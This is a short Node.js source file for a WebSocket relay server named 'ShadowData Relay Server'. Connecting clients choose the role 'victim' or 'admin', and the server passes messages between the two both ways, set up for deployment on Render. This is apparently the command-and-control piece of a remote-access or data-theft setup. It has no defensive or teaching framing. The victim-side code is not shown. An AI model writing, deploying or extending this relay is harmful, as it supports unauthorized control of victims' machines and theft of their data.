const express = require('express');
const { WebSocketServer } = require('ws');
const http = require('http');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

let victimSocket = null;
let adminSocket = null;

app.get('/', (req, res) => {
    res.send('ShadowData Relay Server is active.');
});

wss.on('connection', (ws, req) => {
    const urlParams = new URLSearchParams(req.url.split('?')[1]);
    const role = urlParams.get('role'); // ?role=victim or ?role=admin

    if (role === 'victim') {
        victimSocket = ws;
        console.log('Victim connected successfully.');
    } else if (role === 'admin') {
        adminSocket = ws;
        console.log('Admin connected successfully.');
    }

    ws.on('message', (message) => {
        if (ws === adminSocket && victimSocket && victimSocket.readyState === ws.OPEN) {
            victimSocket.send(message);
        } else if (ws === victimSocket && adminSocket && adminSocket.readyState === ws.OPEN) {
            adminSocket.send(message);
        }
    });

    ws.on('close', () => {
        if (ws === victimSocket) {
            victimSocket = null;
            console.log('Victim disconnected.');
        }
        if (ws === adminSocket) {
            adminSocket = null;
            console.log('Admin disconnected.');
        }
    });
});

// Render assigns a dynamic port via process.env.PORT; default to 10000 if local
const PORT = process.env.PORT || 10000;

// Explicitly bind to '0.0.0.0' so external Render traffic can reach the app
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server successfully started and listening on port ${PORT}`);
});
